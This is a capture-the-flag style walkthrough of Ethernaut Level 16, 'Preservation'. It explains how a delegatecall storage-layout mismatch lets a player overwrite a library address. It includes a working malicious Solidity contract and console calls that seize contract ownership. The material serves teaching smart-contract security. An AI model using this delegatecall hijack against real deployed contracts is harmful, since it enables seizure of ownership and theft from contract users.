# Level 16: Preservation

This is the level 16 of OpenZeppelin [Ethernaut](https://ethernaut.openzeppelin.com/) web3/solidity based game.

## Pre-requisites
- [Layout of state variables](https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html#layout-of-state-variables-in-storage) in Storage
- Context preserving nature of [Delegatecall](https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c) function

## Hack
Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

`player` has to claim the ownership of `Preservation`.

The vulnerability `Preservation` contract comes from the fact that its storage layout is NOT parallel or complementing to that of `LibraryContract` whose method the `Preservation` is calling using `delegatecall`.

Since `delegatecall` is context-preserving any write would alter the storage of `Preservation`, and NOT `LibraryContract`.

The call to `setTime` of `LibraryContract` is _supposed_ to change `storedTime` (slot 3) in `Preservation` but instead it would write to `timeZone1Library` (slot 0). This is because `storeTime` of `LibraryContract` is at slot 0 and the corresponding slot 0 storage at `Preservation` is `timeZone1Library`.

```
       |  LibraryContract         Preservation
--------------------------------------------------
slot 0 |     storedTime   <-   timeZone1Library
slot 1 |        _              timeZone2Library
slot 2 |        _                   owner
slot 3 |        _                 storedTime
```

This information can be used to alter `timeZone1Library` address to a malicious contract - `EvilLibraryContract`. So that calls to `setTime` is executed in a `EvilLibraryContract`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract EvilLibraryContract {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
```

Note that storage layout of `EvilLibraryContract` is complementing to `Preservation` so that proper state variables are changed in `Preservation` when any storage changes. Moreover, `setTime` contains malicious code that changes ownership to `msg.sender` (which would the `player`).

Let's start the attack!

First deploy `EvilLibraryContract` and copy it's address. Then alter the `timeZone1Library` in `Preservation` by:
```javascript
await contract.setFirstTime(<evil-library-contract-address>)
```
(a 32 byte `uint` type can accommodate 20 byte `address` value)

Now the `delegatecall` in `setFirstTime` would execute `setTime` of `EvilLibraryContract`, instead of `LibraryContract`.

Call `setFirstTime` with any `uint` param:
```javascript
await contract.setFirstTime(1)
```

Bang! `player` (`msg.sender`) is  set as `owner` through `setTime` of `EvilLibraryContract`.

Verify by:
```javascript
await contract.owner() === player

// Output: true
```

Level cracked!


_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/the_nvn)_ 🙏

